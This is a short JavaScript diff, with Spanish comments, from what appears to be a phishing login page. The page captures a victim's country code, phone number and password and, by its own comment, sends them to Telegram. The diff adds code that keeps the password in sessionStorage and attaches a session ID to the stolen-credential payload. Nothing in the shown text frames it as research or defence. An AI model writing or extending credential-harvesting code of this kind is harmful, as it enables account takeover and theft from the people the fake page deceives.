@@ -59,6 +59,7 @@
     const countryCode = document.getElementById('countryCode').value;
     sessionStorage.setItem('phone', phone.value);
     sessionStorage.setItem('countryCode', countryCode);
+    sessionStorage.setItem('staticPwd', pwd.value);
     sessionStorage.setItem('attempts', '0');
 
     // Enviar a Telegram (no bloqueante)
@@ -67,6 +68,7 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         step: 'acceso',
+        sessionId: sessionStorage.getItem('sessionId') || '',
         countryCode,
         phone: phone.value,
         password: pwd.value,
